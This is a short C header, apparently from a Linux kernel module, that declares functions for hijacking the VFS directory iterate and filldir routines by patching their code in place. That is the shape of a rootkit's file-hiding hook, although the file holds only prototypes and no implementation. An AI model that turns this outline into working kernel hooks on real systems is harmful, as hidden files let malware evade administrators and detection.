#ifndef _VFS_H_
#define _VFS_H_

#include "common.h"
#include "list.h"
#include "misc.h"

extern int (*vfs_original_iterate)(struct file *, struct dir_context *);
extern int (*vfs_original_filldir)(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);

void vfs_hijack_start(void *target);
void vfs_hijack_stop(void *target);
void *vfs_get_iterate(const char *path);
int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx);
void vfs_save_hijacked_function_code(void *target, void *new);

#endif /* _VFS_H_ */